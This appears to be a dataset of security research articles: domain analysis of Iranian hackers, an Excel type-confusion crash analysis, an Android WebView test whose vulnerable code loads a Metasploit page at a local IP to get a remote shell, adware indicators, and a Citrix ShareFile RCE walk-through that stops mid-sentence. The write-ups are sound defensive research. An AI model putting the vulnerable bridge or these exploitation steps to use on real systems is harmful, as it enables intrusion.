f2ffe625-54db-582b-a8fa-13b2d248bb02,04-October-2022,Probing an Active Digital Trail of Iranian Hackers,"Threat researcher finds more than 4,400 domain names linked to Iranian hackers. Nearly a third of the domains were registered with GoDaddy and other top registrars. The hackers' domain portfolio was mostly registered in the U.S., but other countries were involved.","WhoisXML API threat researcher Dancho Danchev obtained a publicly accessible list of email addresses known to be owned and used by Iranian hackers. The email addresses led us to more than 4,400 domain names, any of which can be weaponized and used in phishing, credential theft, and other forms of cyber attacks. We studied the domain portfolio in light of our DNS, WHOIS, and IP intelligence and uncovered the following: A sample of the additional artifacts obtained from our analysis is available for download from our website . Nearly a third of the domains were registered with GoDaddy and Network Solutions. The other top registrars were Namecheap, PDR Ltd., CSL Computer, TurnCommerce, Maff, Domain International Services, and Gname. On the other hand, the IP addresses of the resolving domains were mostly assigned to Amazon, Softqloud, Cloudflare, Google, Gransys, Hetzner, Squarespace, Peg Tech, Confluence, and Unified Layer. We performed a lexical analysis of the domains possibly connected to the Iran-based hackers. Some of the most common text strings and examples of domains bearing them were: These and other recurring words can be seen in the image below. The hackers’ domain portfolio mostly fell under the .com space, but other TLDs were used, including .ir, .net, .org, .biz, and .us. With the help of Bulk IP Geolocation and Bulk WHOIS Lookup , we determined that the U.S. was the domain portfolio’s top location in terms of IP resolution and domain registration. That can be seen in the side-by-side comparison below. The other countries that appeared on both charts include Canada and China. Aside from parked domains and gambling and adult sites, other contents hosted on the domains were mostly news- and e-commerce-related. We also found interesting content that appeared on two domains that displayed a PayPal donation page. Other suspicious website screenshots include those that were made to appear like Discuz and WordPress. Aside from scrutinizing the domains uncovered by our threat researcher, we also endeavored to find more possible domain connections. That was done by looking at the historical WHOIS records of the domains that were reported as malicious. One malicious domain, salarserver[.]ir, was tied to four unredacted email addresses all throughout its registration history. Performing a reverse WHOIS search on the emails, we discovered 981 additional domains that were not on the initial list of domains. They were also mostly under the .ir (82%) and .com (13%) TLD spaces. Ten of the additional domains were flagged as malicious, with some looking quite similar to the malicious domains on our initial list—absher-sa-sa[.]com and salarserver[.]ir. Digging deeper, we used Reverse WHOIS Search again to uncover .com domains containing the text string “absher,” and .ir domains containing “salar.” That led us to 1,162 additional digital properties, about 12% of which were flagged as malicious. We uncovered the domain portfolio of a group of hackers by running DNS and WHOIS analyses on email addresses tied to them. These connections were further expanded by digging into the historical WHOIS records of the malicious domains and looking for string-related associations. While some may have coincidental connections, the majority can be treated as suspicious and may help the cybersecurity community formulate an effective early warning system. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
21784986-aad2-5a58-bad2-7615dc1a5a4c,19-July-2022,Under Siege for Months: the Anatomy of an Industrial Espionage Operation,Bitdefender's Cyber-Threat Intelligence Lab monitors infrastructure for early signs of compromise. The whitepaper includes a list of indicators of compromise and the currently known indicators of attack.,"Providing security to customers is a complex and resource-intensive endeavor in a complex world of deeply integrated technologies. As part of our commitment to keeping customers safe, we often complement our security stack offerings with managed detection and response, threat hunting and constant monitoring of customer infrastructure. The Cyber-Threat Intelligence Lab keeps a close eye on alerts and EDR reports coming from infrastructure, helping owners and maintainers navigate the early stages of compromise. This is the case of an incident we worked on with a technology partner in the United States of America. We identified a complex kill chain and monitored the attack through various stages to assess the extent of the breach and help the customer regain control of the network. We are releasing this research paper to help other decision-makers cover their blind spots and improve their overall security posture. Attack at a Glance Download the whitepaper An up-to-date and complete list of indicators of compromise is available to Bitdefender Advanced Threat Intelligence users. The currently known indicators of compromise can be found in the whitepaper below."
0dca21fc-f7bb-5f47-81ce-879089ddb1d7,21-September-2016,Once Upon a Type Confusion,"Microsoft released the MS16–107 to patch CVE-2016-3363, a Type Confusion vulnerability in Microsoft Excel 2007, 2010, 2013 and 2016 versions. I determined the vulnerability class and some lightweight technical details. The vulnerability occurs in the protected mode of Microsoft Excel in protected mode.","Last week, Microsoft released the MS16–107 to patch CVE-2016-3363, which is a Type Confusion vulnerability within Microsoft Excel 2007, 2010, 2013 and 2016 both 32 and 64 bit versions. This post will show you how I determined the vulnerability class and some lightweight technical details around the vulnerability. After minimising the Proof of Concept and visualising the structures in offviz , we can see the differences. Here is the original sample: Here is the trigger sample: Within a BIFFRecord structure, there are several BIFFRecord_General structures that are defined. Following a set number of BIFFRecord_General structures defined in the BIFFRecord, the code blindly assumes that the next structure is a EOF Record. More details about the specification can be found in OpenOffice’s version of Microsoft Excel File Format document. The trigger occurs in the protected mode (brokered process) of Microsoft Excel, so we are going to have to enable child debugging within windbg. Running the Proof of Concept yields in the following crash dump: (6ec.9a0): Break instruction exception — code 80000003 (first chance) eax=7ffd5000 ebx=00000000 ecx=00000000 edx=776bebb3 esi=00000000 edi=00000000 eip=77653c4c esp=045afe3c ebp=045afe68 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!DbgBreakPoint: 77653c4c cc int 3 0:009> .childdbg 1 Processes created by the current process will not be debugged 0:009> g ... (2dc.ce8): Break instruction exception - code 80000003 (first chance) eax=00000000 ebx=00000000 ecx=0020f59c edx=77666bf4 esi=fffffffe edi=00000000 eip=776c0541 esp=0020f5b8 ebp=0020f5e4 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!LdrpDoDebuggerBreak+0x2c: 776c0541 cc int 3 1:025> g ... (2dc.ce8): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0ae04c98 ebx=0ae04de8 ecx=0a3c0fa0 edx=00000301 esi=00000007 edi=001ff748 eip=2fd22c77 esp=001ff728 ebp=001ff764 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 Excel!Ordinal40+0x322c77: 2fd22c77 8b5164 mov edx,dword ptr [ecx+64h] ds:0023:0a3c1004=???????? We can see that initially it is an out-of-bounds read in @ecx. Lets go ahead and dump @ecx to get an understanding for its size and structure. 1:025> !heap -p -a @ecx address 0a3c0fa0 found in _DPH_HEAP_ROOT @ 1211000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize — VirtAddr VirtSize) a243000: a3c0fa0 60 — a3c0000 2000 73218e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 776e616e ntdll!RtlDebugAllocateHeap+0x00000030 776aa08b ntdll!RtlpAllocateHeap+0x000000c4 77675920 ntdll!RtlAllocateHeap+0x0000023a 62f06cca mso!Ordinal149+0x000078e0 2fb29b51 Excel!Ordinal40+0x00129b51 2fb29af7 Excel!Ordinal40+0x00129af7 2fb61228 Excel!Ordinal40+0x00161228 2fb5f32e Excel!Ordinal40+0x0015f32e 2fb35b78 Excel!Ordinal40+0x00135b78 2fb34e64 Excel!Ordinal40+0x00134e64 7728c4f7 USER32!InternalCallWinProc+0x00000023 77285faf USER32!UserCallWinProcCheckWow+0x000000e0 77284f1b USER32!DispatchClientMessage+0x000000e6 7727e992 USER32!__fnINLPCREATESTRUCT+0x0000008b 77666b2e ntdll!KiUserCallbackDispatcher+0x0000002e 7727ec5c USER32!_CreateWindowEx+0x00000201 7727ecb7 USER32!CreateWindowExW+0x00000033 2fb2337d Excel!Ordinal40+0x0012337d 2fb34cbe Excel!Ordinal40+0x00134cbe 2fb5f248 Excel!Ordinal40+0x0015f248 2fc8cdfe Excel!Ordinal40+0x0028cdfe 305bc671 Excel!MdCallBack12+0x0023e0f6 302c1482 Excel!Ordinal40+0x008c1482 302b6ceb Excel!Ordinal40+0x008b6ceb 302ccea6 Excel!Ordinal40+0x008ccea6 302d1708 Excel!Ordinal40+0x008d1708 302d2067 Excel!Ordinal40+0x008d2067 302d29d2 Excel!Ordinal40+0x008d29d2 302d2e11 Excel!Ordinal40+0x008d2e11 2fb8a514 Excel!Ordinal40+0x0018a514 30248977 Excel!Ordinal40+0x00848977 1:025> dds @ecx 0a3c0fa0 00000000 0a3c0fa4 00000005 0a3c0fa8 08c8ae70 0a3c0fac 08c60880 0a3c0fb0 00000000 0a3c0fb4 00000011 0a3c0fb8 00000014 0a3c0fbc 00000000 0a3c0fc0 00000000 0a3c0fc4 00000000 0a3c0fc8 00000000 0a3c0fcc 00000000 0a3c0fd0 00000001 0a3c0fd4 00000000 0a3c0fd8 ffffffff 0a3c0fdc ffffffff 0a3c0fe0 ffffffff 0a3c0fe4 ffffffff 0a3c0fe8 00000000 0a3c0fec 2faf7980 Excel!Ordinal40+0xf7980 0a3c0ff0 00000000 0a3c0ff4 0a3c0fa0 0a3c0ff8 00000000 0a3c0ffc 00000000 0a3c1000 ???????? 0a3c1004 ???????? 0a3c1008 ???????? 0a3c100c ???????? 0a3c1010 ???????? 0a3c1014 ???????? 0a3c1018 ???????? 0a3c101c ???????? We can see that the heap buffer is of size 0x60 bytes. Now, we can set a breakpoint at the @eip where the access violation is occurring and run the sample.xls file to see if there is a change in the heap buffer structure are size. Breakpoint 0 hit eax=21aa8c98 ebx=21aa8de8 ecx=2a97cf70 edx=00000301 esi=00000007 edi=001d1e58 eip=2f7f2c77 esp=001d1e38 ebp=001d1e74 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202 EXCEL!Ordinal40+0x322c77: 2f7f2c77 8b5164 mov edx,dword ptr [ecx+64h] ds:0023:2a97cfd4=00000000 0:000> !heap -p -a @ecx address 2a97cf70 found in _DPH_HEAP_ROOT @ 11e1000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 21a03854: 2a97cf70 90 - 2a97c000 2000 6d8c8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 776e616e ntdll!RtlDebugAllocateHeap+0x00000030 776aa08b ntdll!RtlpAllocateHeap+0x000000c4 77675920 ntdll!RtlAllocateHeap+0x0000023a 642a6cca mso!Ordinal149+0x000078e0 2f5f9b51 EXCEL!Ordinal40+0x00129b51 2f5f9af7 EXCEL!Ordinal40+0x00129af7 2f631228 EXCEL!Ordinal40+0x00161228 2f7f7a89 EXCEL!Ordinal40+0x00327a89 2f6346cc EXCEL!Ordinal40+0x001646cc 2f634610 EXCEL!Ordinal40+0x00164610 2f7e95c4 EXCEL!Ordinal40+0x003195c4 2f8b14a5 EXCEL!Ordinal40+0x003e14a5 3008e072 EXCEL!MdCallBack12+0x0023faf7 2fd91482 EXCEL!Ordinal40+0x008c1482 2fd86ceb EXCEL!Ordinal40+0x008b6ceb 2fd9cea6 EXCEL!Ordinal40+0x008ccea6 2fda1708 EXCEL!Ordinal40+0x008d1708 2fda2067 EXCEL!Ordinal40+0x008d2067 2fdb2011 EXCEL!Ordinal40+0x008e2011 64088fea mso!Ordinal766+0x0000264e 64089622 mso!Ordinal6107+0x00000584 6406be75 mso!Ordinal9839+0x00000ff0 6406c77d mso!Ordinal3502+0x000003b7 63b4f77b mso!Ordinal6326+0x00003cc5 64088f77 mso!Ordinal766+0x000025db 6374b5b2 mso!Ordinal4178+0x000011d3 6374b2e8 mso!Ordinal4178+0x00000f09 6374a48a mso!Ordinal4178+0x000000ab 2f6d6a5a EXCEL!Ordinal40+0x00206a5a 2f657776 EXCEL!Ordinal40+0x00187776 2f5f133c EXCEL!Ordinal40+0x0012133c 0:000> dds @ecx l24 2a97cf70 2b500fa0 2a97cf74 00000002 2a97cf78 21890e70 2a97cf7c 2b4fedc8 2a97cf80 00000002 2a97cf84 00000011 2a97cf88 00000014 2a97cf8c 00000000 2a97cf90 00000000 2a97cf94 00000000 2a97cf98 00000000 2a97cf9c 00000000 2a97cfa0 00000001 2a97cfa4 00000000 2a97cfa8 00000005 2a97cfac 00000006 2a97cfb0 00000007 2a97cfb4 00000000 2a97cfb8 00000000 2a97cfbc 2f5c7980 EXCEL!Ordinal40+0xf7980 2a97cfc0 00000000 2a97cfc4 2a97cf70 2a97cfc8 00000000 2a97cfcc 00000000 2a97cfd0 00000001 2a97cfd4 00000000 2a97cfd8 00000000 2a97cfdc 00000000 2a97cfe0 00000000 2a97cfe4 00000000 2a97cfe8 00000000 2a97cfec 00000000 2a97cff0 00000000 2a97cff4 00000000 2a97cff8 00000000 2a97cffc 23416f28 We can see that this time, the heap chunk size is 0x90 and that at our +0x64 dereference location, it is set to null. This indicates that the code is suppose to be operating on a heap chunk of size 0x90, yet in our crashing Proof of Concept, we can see it is using a chunk of size 0x60 with a different structure. What is not shown here, is that both the trigger and the sample files, when hitting this breakpoint, have the exact same callstacks. This is important as it is possible that the same location, can operate on different object types and sizes (although unlikley). Now, at +0x0 and +0x8c of the valid chunk, we can see other heap chunk pointers that could be used by subsequent functions to achieve Remote Code Execution via a code flow redirection. Additionally, after analysing the vulnerability in IDA, an alternate approach to exploitation was discovered. We see the crashing @eip is located in sub_30322AF2. .text:30322C77 loc_30322C77: .text:30322C77 mov edx, [ecx+64h] ; control @edx .text:30322C7A mov ecx, [ecx+68h] ; control @ecx .text:30322C7D sub [esp+38h+var_20_taint], edx ; taint var 0x20 .text:30322C81 sub [esp+38h+var_1C_taint], ecx ; taint var 0x1c Now, a few blocks down with multiple pathways from our crashing @eip we see some dword writes, the first of which, we control the value being written: .text:30322D00 loc_30322D00: .text:30322D00 mov edi, [ebp+arg_0] ; des .text:30322D03 add edi, 18h ; des offset +0x18 .text:30322D06 lea esi, [esp+38h+var_20_taint] ; src .text:30322D0A movsd ; write dword This all looks a bit clearer in windbg: 30272d00 8b7d08 mov edi,dword ptr [ebp+8] 30272d03 83c718 add edi,18h 30272d06 8d742418 lea esi,[esp+18h] 30272d0a a5 movs dword ptr es:[edi],dword ptr [esi] Essentially crushing this 0x00000007 value with a controlled value in an alternate heap chunk: 1:025> dd poi(ebp+8)+18 L1 0ade2df0 00000007 Conclusion Whilst in context, exploiting such a vulnerability would be very hard, type confusion vulnerabilities often give attackers several opportunities to achieve relative reads/writes or direct control flow highjacking. In this case, we had the ability to tamper with data in an alternate chunk, thus, potentially influencing the control of execution when code is operating on that heap chunk. Many more opportunities for exploitation are likely to exist for this vulnerability and type confusions are excellent primitives for an attacker. Feel free to check out the advisory or the poc if you like."
c5a18475-cd79-5edd-8b53-8de1c71f6639,25-January-2019,How Does The SDK Version Affect The Security of Android Applications?,Metasploit was asked to test the effect of minSdkVersion on Android security. We created a vulnerable application that targeted a library with a vulnerability in the older API version of the Android SDK. The vulnerability allows code execution in API versions prior to 17.0.,"We were recently tasked with determining what effects the use of the minSdkVersion property within Android projects has on the security of the application; specifically whether or not it can result in a downgrade attack of the runtime environment. In the case we were asked to look into, the application targetted a recent SDK version but also utilised a library which was targetting a much older SDK version, with several high severity vulnerabilities. The question we set out to answer was whether or not: The lower minSdkVersion of the library could force the application to run in the context of the older API A lower minSdkVersion specified at applications level will force the Android runtime to run in an older context Creating a Vulnerable Application To determine how the SDK version affects an application, a small application needed to be put together which would contain a vulnerability that was mitigated at the OS level in a later version. For this test, we chose CVE-2012-6636 ; the vulnerability that allows code execution via the JavaScript bridge and reflection in API versions prior to 17. The vulnerable application consisted of a single activity which launches another activity contained within a library which contains the following code: package com.digitalinterruption.api15library ; import android.support.v7.app.AppCompatActivity ; import android.os.Bundle ; import android.webkit.WebView ; import android.webkit.WebViewClient ; public class WebViewActivity extends AppCompatActivity { @Override protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_web_view ); WebView webView = ( WebView ) findViewById ( R . id . webView ); webView . setWebViewClient ( new WebViewClient () { @Override public boolean shouldOverrideUrlLoading ( WebView view , String url ) { view . loadUrl ( url ); return true ; } }); webView . getSettings (). setJavaScriptEnabled ( true ); webView . addJavascriptInterface ( new JavaScriptInterface (), ""jsinterface"" ); webView . loadUrl ( ""http://192.168.1.157:4444/GEpBE2VaPK26N4"" ); } final class JavaScriptInterface { JavaScriptInterface () { } public String getSomeString () { return ""Return value of JavaScriptInterface.getSomeString"" ; } } } Upon launching this activity, a page being served by Metasploit would be loaded into the WebView and if vulnerable to CVE-2012-6636 would result in a remote session on the Android device. Test 1: Matching API Levels The aim of this test was to determine if a matching minSdkVersion across the vulnerable library and the application using it will result in differing behaviour across an Android device at API level 15 vs API level 27. When the application was run in an AVD using API 15, the exploit was successfully executed and resulted in a remote shell; as can be seen in the video below: When run in the API 27 virtual device, the page loaded into the WebView instead displayed a generic 404 error page: Back in the Metasploit console, we could see the 404 page was sent as a result of Metasploit failing to find a vulnerable JavaScript bridge: This means that despite the lower minSdkVersion present in both the library and application’s Gradle files, the functionality never runs in any form of compatibility mode to make it function as it did in an earlier version of the API. Test 2: Lower Library API Level Although the first test confirmed what we believed would be the case (that the downgrade attack would not work), for completeness, we tested against the use-case that was originally proposed to us - an application with a higher API level using a library with a lower level. First, we tweaked the Gradle build file of the application to make it instead require API level 27 or higher: android { compileSdkVersion 27 defaultConfig { applicationId ""com.digitalinterruption.apileveltest"" minSdkVersion 27 targetSdkVersion 27 versionCode 1 versionName ""1.0"" testInstrumentationRunner ""android.support.test.runner.AndroidJUnitRunner"" } buildTypes { release { minifyEnabled false proguardFiles getDefaultProguardFile ( 'proguard-android.txt' ), 'proguard-rules.pro' } } } With the library still requiring a minimum API level of 15 and the application requiring 27, we deployed the application once more to the API 27 AVD and witnessed the same failure as in the previous test. Summary When working with the Android API, changing the API level of the application will not result in the functionality being unified across different Android builds. The API level you define in your Gradle build is used only at compile time / to flag to your IDE appropriate notifications and advice (such as insecure usage and deprecation warnings). For this reason, you should consider carefully your design decisions and be aware of any potentially dangerous vulnerabilities from previous releases that could impact your application’s ecosystem, should you choose to continue supporting older devices."
0348018c-4add-5e65-a3d9-6733f130066e,17-August-2022,Real-Time Behavior-Based Detection on Android Reveals Dozens of Malicious Apps on Google Play Store,Malicious apps are being found on the Google Play Store. Bitdefender says the apps are often disguised as legitimate apps. The malicious apps change their name and icon to make it difficult for users to uninstall them.,"Note: all applications mentioned in this research have been taken down and are no longer accessible. For the past few years, cyber-criminals have strengthened their efforts to have malicious applications listed on Google Play Store – the world's most trafficked Android app source. While the platform's security checks have improved through the years, our research still uncovers malicious apps that use a vast array of tricks to bypass these checks. This is the case of a new malware campaign on the Google Play Store where numerous apps use false pretexts to lure victims into installing them, only to change their name and aggressively serve ads afterward. One of the ways cyber-criminals monetize their presence on Google Play is to serve ads to their victims. While this may sound diminutive, these ads served to victims are disrupting the usage experience and can link directly to malware. Many legitimate apps offer ads to their users, but these ones show ads through their own framework, which means they can also serve other types of malware to their victims. Most of the time, users can choose to delete the application if they don't like it. But these new malicious apps trick victims into installing them, only to change their name and icons and even take some extra steps to conceal their presence on the device. Users can still delete them at will, but the developers make it more difficult to find them on the affected devices. While all of the detected apps are clearly malicious, the developers were able to upload them to the Google Play Store, offer them to users and even push updates that made the apps better at hiding on devices. Bitdefender identified the malicious apps using a new real-time behavioral technology designed to detect precisely these dangerous practices, among many others. This new technology is already producing results as new detections are instantly shared with all Bitdefender Mobile Security users. We looked at the 'GPS Location Maps' app as the first example. With over 100k downloads, it's one of the more popular, but we noticed it doesn't have any reviews. Immediately after installation, the app changes its label from 'GPS Location Maps' to 'Settings' and then shows additional websites in WebViews and an advertisement. WebViews is part of the Android operating system that allows apps to load content like web pages, ads, and more. The ' GPS Locations Maps ' app makes it difficult for users to find and uninstall it by changing its icon. Also, on some devices, a few malicious apps even request permission to bypass the battery optimization feature and start foreground services notifications to stay alive and not get killed by the system. Many of the detected apps also request permission to display over other apps, which means that they are likely also simulating user clicks to rake on profits. The developers who created the ' GPS Location Maps ' added heavy code obfuscation and encryption in order to make reverse engineering difficult. The main Java malicious payload hides inside two encrypted DEX files, and the decryption occurs inside obfuscated native code. Even after decryption, the resulting Java code strings remain obfuscated. Malicious behavior like changing the icon also happens in a different native 'so' file than the one used for decryption and remains obfuscated. Encrypted DEX files inside the assets of the application: Obfuscated strings (base64 into XOR): Native functions declared: One way to stay hidden from a user bent on uninstalling the app is to change the icon into something innocuous, like the 'Settings' app. It does that by declaring an alias launcher. After installing another icon and label, it changes the main launcher, replacing it with the alias one with the label and icon for 'Settings.' The alias launcher corresponds to another activity, hidden inside the `com.android.setting` package, probably to look more legit. When launched, this activity renders itself with '0' size in a corner, then launches the setting page for the phone, tricking the user into thinking that the real settings button was pressed. Alias: Fake settings activity: Some apps also contain different icon launchers for the settings app, depending on the device: Another interesting technique developers use to obscure apps is to ensure they don't show in the list of the most recently used apps on Android. These apps also have the flag android:excludeFromRecents=""true"" set in their manifest, meaning that when a user looks at recent apps opened on the device, the adware app is not present among them. ' GPS Location Maps ' is just one of the many that we have identified to manifest similar malicious behavior. We noticed that the initial versions of some of the detected apps didn't contain the ""Settings"" icons. The developers added the icons in subsequent app updates on the Play store. When we look closer at the developers of the packed and obfuscated apps, a pattern emerges, showing a similar naming style. All the malicious app developers have just one application uploaded to the store. Also, the emails and websites related to the developers look similar to each other, which likely leads us to believe that all of these apps are the work of a single group or even developer. The malicious behavior doesn't trigger on all devices, as there are some checks embedded in the apps likely related to the device location, language or other factors. Developer Name Email Website Qasim.Llc Steelrbasic@gmail.com https://personalitycharginshow[.]xyz ALCANTARA.Lab TipAprilb@gmail.com https://smartqrscanner1[.]xyz Baig.Corp Ississppifinest2@gmail.com https://animatesstickermaster[.]xyz Hamid.Apps jemarchag@gmail.com https://gps1ocationfinder[.]xyz Emmanuel.Llc Quintonjxus@gmail.com https://mygps123123[.]xyz Jamie.Lab jjamiemunoz417@gmail.com https://artgirlswallpaperhd[.]xyz Bennington.Llc kkarlbennington@gmail.com https://catsimulator1[.]xyz Josh.Lnc huhua.luc@gmail.com http://smartwifii123[.]xyz Vern.Apps Vernl3138@gmail.com https://imagewarpcamera[.]xyz VILORIA.Corp Jamelpmac@gmail.com https://smartqrcreator1[.]xyz Abid.Studio ita.mita594@gmail.com https://colorizeoldphoto[.]xyz Adeel.Studio ikvznj@gmail.com https://smartaps1ocation[.]xyz Haq.Corp Wycliffedennis07@gmail.com https://secrethoroscope1[.]xyz Nadeem.Apps KnowMonty@gmail.com https://volumecontroll[.]xyz Cedrick.Corp Cedrickoayz@gmail.com https://gps1ocationmaps[.]xyz RICHARD.Lnc Flossiezxe@gmail.com https://girlsartwallpaper[.]xyz Sushil.Dev tacie.bush@gmail.com https://mediavolumeslider[.]xyz Haider.Studio Eduardoaunx@gmail.com https://sleepsoundss[.]xyz Kumar.Apps Randytzjp@gmail.com https://qrcreatorr12[.]xyz Waseem.Llc MarquisDunlap35@gmail.com https://secretastrology[.]xyz/ Butt.Corp eterbrellocvx@gmail.com https://colorizephotos[.]xyz/ Vledern Studio deernivle67@gmail.com - While official stores are usually very good at weeding malicious or dangerous applications out, some history shows that a small number of bad apps manage to get through and make victims until they get reported. Just because we download an app from the official store doesn't mean it will be safe. We continue to build new detection capabilities in Bitdefender Mobile Security to help users identify bad applications and have them removed from the system. You can also follow a few simple rules that can keep you safer: Package name Hash Downloads gb.packlivewalls.fournatewren 83fc9c22697d23126105bef2ac956c83a9b5cc700a3635ba93ccf999d15be5cc 100K+ gb.blindthirty.funkeyfour 5df41117cfb8fdf4549c0cad570c30411770857783b40d7a0eb5cee5c9a01623 100K+ gb.convenientsoftfiftyreal.threeborder 1dc46e16a7e477b9cd04a9a29c881254512d0ad5e89be6b120f30b06d4f5991b 100K+ gb.helectronsoftforty.comlivefour 92dcedc7054adde430407f430ee444ba6c0d70d5787eb92295360fc015b1f029 100K+ gb.fiftysubstantiated.wallsfour beb0e689572650355ad39165cfee0f3695507a39213913a54718631cb5d17b6b 100K+ gb.actualfifty.sevenelegantvideo 1ccd7ac60d2caa3ffb56648ba5dfbd942f9ad0416de0c215f3d11457a5a36d55 100K+ gb.crediblefifty.editconvincingeight 123a589ee242ee8ab1b072cbed287b4a20793e02f81a0cbe866ed346d68e0cb4 100K+ de.eightylamocenko.editioneight 46141428f4c5d878b2644aa76cf96ad277e5038443698e4232fd3d9c0eb2ed1c 100K+ gb.convincingmomentumeightyverified.realgamequicksix 731a6d533edbedf5944f6d3660c3984ff41950d4b748e1e1c41b8457ccef0a4a 100K+ gb.labcamerathirty.mathcamera 9453085d60429987598c44c81693d733c38468bc233feefef46f84769c24fd15 100K+ gb.mega.sixtyeffectcameravideo b40cca66d13d28745098fce90ac71d451ce28853ed81a7ff9f8bd908d91512db 100K+ gb.theme.twentythreetheme 0a366901588120665560c1e5dd0f7394ab6fedd4563c4c2951822b4194a8a42b 100k+ gb.tolltwentytwo.ikey d9bb7bf435c9af3e736bcc16626cf33e3b6e675a5f0a8fd1acd7e8c48e1bcd51 50K+ com.smart.tools.wifi 0e4f1b1a22b059b95a828215739298335b1fff7f54cf85c1c75fc30ca5ca6cd6 10K+ jkdf.gds.gds.g 4e5ea73770c5bee7fb8cbaeb188d2d7258ba8879cfdb4d459dfbdd7dd9a3e650 10K+ com.newsoft.camera 9102fd2b2a6c38a36e344db0c836c05172aff9169ff4389195ade3cc47cd086b 100K+ com.xmas.artgirlswallpaperhd 985600862b5fc4de0ec62322bf9eee4b6c0cc3fc5db6f23cb65cbe81088a3c8d 100k+ hj.jk.jikj.jkj 0cf16f21330acfb9006e8fa1d67d5f6d48e0623390482ce4835d1064e38c58d6 50K+ com.creator.smartqrcreator 4cd13ce239f6567744a2b4e9819cb420c3e311e05c1afab9d784eb344c8d4868 10K+ finze.lockgti.dae.cag 1b1d7e825c2299a17309074a2d411ee3480501e417482331f020d93a21c08e95 500+ kk.f.ea.tew.t 45cc6ac4b52492291bc572fa253dcc8db53b167080dd08490d16f8218b8ebfc3 100K+ com.xmas.girlsartwallpaper 3b6639df04f9745ff74d9fe58dcd529d58208248358291d06e65e04aa2481d97 10K+ sc.qs.vak e51585871b56d9c7707f8b41ab045dc26e11f976b519cc8e2fdc7a8cf79875e0 50K+ zzhse.ge.ge.ge.e 16d5fd1ab5cb0bea28dfb7333b7b419b5de00024d391a3cd8dce9a0823e09cfc 100K+ ice.ccylice.volume cb9fc87ff97e398a4375062d5d5ab8d29706d830cd2ef6fcde5aea30f6f4a45d 50K+ ck.lad.secret 4240ca3ea6eba010ee3b169cda066d8beeb7b8bf7a065abfeac9b75a301a1706 10K+ smart.ggps.lockakt b720175c57ed84fe7fec73554dcf12e71c33e6a322a23b0663dc132edc7203ee 10K+ am.asm.master a00e1b5ca10efdf11fbd3c45349c4e3994134e3100a23f50df62a9398529b176 100K+ com.charging.show c519c9b63ce046c737fe9c222436f4138acfe9de277cc4da6019b8c3533e9aa9 100K+ com.voice.sleep.sounds 9885ef4f3dfff7962c8f2e319957d07755c192e68978962962492e60c73ac222 100K+ joao.de.def.e.aew 0ecaee04b59c137760b7aafa46772a3be7e3581b36d79b5c61ea713ccfe5a386 10K+ ifa.nod.vys 69f94ac8d1ce85d0904a3cafb7828b84e18ecd858a2d56aa4c2fdd1fd7afc02e 10K+ qu.motor.astrology 134aeabf2c66be6af458d5d51c22d237c1f260f1ab10dcb99b714eba5d8bff73 10K+ ice.ccylice.colorize 449328469b38378ca1214c421305d0706dca6cc79a68ea2e5e2904a519968c03 10K+ gb.sixtycreativecyber.magiceleganttwo 054f8bfa280654b0a5cc9b3a8652e438fb77dc63d66ffb10c06743ccf290342b 50K+"
7bb34cb4-8cec-5712-9b76-46b4a70b04a7,21-September-2021,RCE in Citrix ShareFile Storage Zones Controller (CVE-2021-22941) – A Walk-Through,Citrix ShareFile Storage Zones Controller uses a fork of the third party library NeatUpload. Versions before 5.11.20 are affected by a relative path traversal vulnerability. Code White analysed the latest version of ShareFile to find and exploit the vulnerability.,"Citrix ShareFile Storage Zones Controller uses a fork of the third party library NeatUpload. Versions before 5.11.20 are affected by a relative path traversal vulnerability ( CTX328123 /CVE-2021-22941) when processing upload requests. This can be exploited by unauthenticated users to gain Remote Code Execution. Come and join us on a walk-though of finding and exploiting this vulnerability. Background Part of our activities here at Code White is to monitor what vulnerabilities are published. These are then assessed to determine their criticality and exploitation potential. Depending on that, we inform our clients about affected systems and may also develop exploits for our offensive arsenal. In April, Citrix published an advisory that addresses three vulnerabilities in ShareFile Storage Zones Controller (from here on just ""ShareFile""). In contrast to a previous patch in the same product , there were no lightweight patches available, which could have been analysed quickly. Instead, only full installation packages were available. So, we downloaded StorageCenter_5.11.18.msi to have a look at it. The Travelogue A first glance at the files contained in the .msi file revealed the third party library NeatUpload.dll . We knew that the latest version contains a Padding Oracle vulnerability, and since the NeatUpload.dll file had the same .NET file version number as ShareFile (i. e., 5.11.18), chances were that somebody had reported that very vulnerability to Citrix. After installation of version 5.11.18 of ShareFile, attaching to the w3wp.exe process with dnSpy and opening the NeatUpload.dll , we noticed that the handler class Brettle.Web.NeatUpload.UploadStateStoreHandler was missing. So, it must have either been removed by Citrix or they used an older version. Judging by the other classes in the library, the version used by ShareFile appeared to share similarities with NeatUpload 1.2 available on GitHub . So, not a quick win, afterall? As we did not find a previous version of ShareFile such as 5.11.17, that we could use to diff against 5.11.18, we decided to give it a try to look for something in 5.11.18. Finding A Path From Sink To Source Since NeatUpload is a file upload handling library, our first attempts were focused around analysing its file handling. Here FileStream was a good candidate to start with. By analysing where that class got instantiated, the first result already pointed directly to a method in NeatUpload, the Brettle.Web.NeatUpload.UploadContext.WritePersistFile() method. Here a file gets written with something that appears to be some kind of metrics of an upload request: By following the call hierarchy, one eventually ends up in Brettle.Web.NeatUpload.UploadHttpModule.Init(HttpApplication) , which is the initialization method for System.Web.IHttpModule : That method is used to register event handlers that get called during the life cycle of an ASP.NET request . That module is also added to the list of modules in C:\inetpub\wwwroot\Citrix\StorageCenter\web.config : After verifying that there is a direct path from the UploadHttpModule processing a request to a FileStream constructor, we have to check whether the file path and contents can be controlled. Back in UploadContext.WritePersistFile() , both the file path and contents include the PostBackID property value. By following the call hierarchy of the assignment of the UploadContext.postBackID field that backs that property, there is also a path 